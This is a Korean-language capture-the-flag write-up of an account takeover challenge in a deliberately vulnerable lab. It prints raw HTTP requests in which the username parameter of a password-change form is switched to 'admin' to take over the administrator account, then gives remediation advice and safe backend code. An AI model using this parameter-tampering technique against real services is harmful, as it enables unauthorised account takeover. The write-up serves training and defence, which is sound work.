+++
title = "VulnABLE CTF [LUXORA] Write-up: Account Takeover (ATO) 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "ATO", "Account Takeover", "Bronze", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Account Takeover (ATO) 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Account Takeover)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/ato/bronze`
- **목표**: 비밀번호 변경 페이지의 로직 결함을 악용하여, 현재 로그인한 내 계정이 아닌 다른 사용자(Admin)의 비밀번호를 무단으로 변경하고 계정을 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/ato/bronze` 경로에 접속하여 제공된 일반 사용자 계정(`user` / `password`)으로 로그인한 뒤, "비밀번호 변경(Change Password)" 기능을 사용해 봅니다.

**[정상적인 비밀번호 변경 요청 패킷]**
```http
POST /ato/bronze/change-password HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session_id=user_session_token

username=user&new_password=hacked123
```

**[해커의 사고 과정]**
1. 이 폼은 새로운 비밀번호(`new_password`)와 함께 대상 사용자의 아이디(`username`)를 명시적으로 파라미터로 보내고 있다.
2. 정상적인 시스템이라면, 서버 측에 저장된 세션(Session)의 유저 정보와 저 파라미터의 `username`이 일치하는지, 혹은 **현재 비밀번호(Current Password)를 묻는 과정**이 있어야 한다.
3. 그런데 현재 비밀번호를 묻지도 않고 있다! 게다가 타겟 아이디를 내가 직접 파라미터로 수정할 수 있다! (전형적인 IDOR / BOLA 결함)

---

## 💥 2. 취약점 식별 및 공격 수행 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Change password for target user)--> [ Web Server ]
                                                    |-- Missing Authorization Check
                                                    |-- Password Changed!
```


이 취약점은 세션과 파라미터 간의 불일치를 검증하지 않는 **Broken Access Control (권한 제어 붕괴)**에서 기인합니다.

Burp Suite의 Repeater 탭으로 방금 보낸 POST 요청을 가져옵니다.

### 💡 파라미터 변조 (Parameter Tampering)
`username` 파라미터의 값을 `user` 에서 `admin` 으로 슬쩍 바꿉니다.

```http
POST /ato/bronze/change-password HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session_id=user_session_token

username=admin&new_password=adminhacked123
```

### 🚀 페이로드 전송 및 결과 확인
수정된 요청을 서버로 보냅니다.

```html
HTTP/1.1 200 OK

<div class="success">
  <h3>Success!</h3>
  <p>Password for user 'admin' has been changed successfully.</p>
</div>
```

서버는 내가 관리자가 아닌 일반 유저 세션을 가지고 있음에도 불구하고, 폼에서 올라온 `username=admin` 이라는 파라미터만을 믿고 관리자의 비밀번호를 `adminhacked123`으로 변경해 버렸습니다!

---

## 🚩 3. 계정 탈취 확인 및 롸잇업 결론

이제 로그아웃한 뒤, 바뀐 비밀번호를 이용해 `admin` 계정으로 다시 로그인해 봅니다.

**[로그인 폼]**
- ID: `admin`
- PW: `adminhacked123`

```html
<div class="dashboard">
  <h2>Welcome, Admin!</h2>
  <p class="flag">FLAG{ATO_🥉_PARAM_TAMPER_A1B2C3}</p>
</div>
```

**🔥 획득한 플래그:**
`FLAG{ATO_🥉_PARAM_TAMPER_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
비밀번호 변경과 같은 민감한 계정 조작 시점에서의 본인 확인 누락이 부른 대형 사고입니다.

* **안전한 패치 가이드**
1. **타겟 식별자 파라미터 제거**: 비밀번호 변경 폼에서 대상자(`username` 또는 `user_id`)를 파라미터로 받으면 안 됩니다. 서버는 오직 **현재 로그인된 세션 정보(`req.session.userId`)**만을 기준으로 조작 대상을 강제해야 합니다.
2. **현재 비밀번호 요구 (Current Password Requirement)**: 비밀번호나 이메일을 변경할 때는 세션 하이재킹을 방어하기 위해 반드시 기존의 비밀번호를 한 번 더 입력하게 하여 재인증(Re-authentication)을 거쳐야 합니다.

```javascript
// 안전한 백엔드 로직 예시
const currentUserId = req.session.user_id;

// 1. 현재 비밀번호 일치 여부 확인
const isValid = verifyPassword(currentUserId, req.body.current_password);
if (!isValid) return res.status(403).send("Invalid current password");

// 2. 파라미터가 아닌 세션 ID를 기준으로 업데이트 수행
await db.query("UPDATE users SET password = ? WHERE id = ?", [hashedNewPassword, currentUserId]);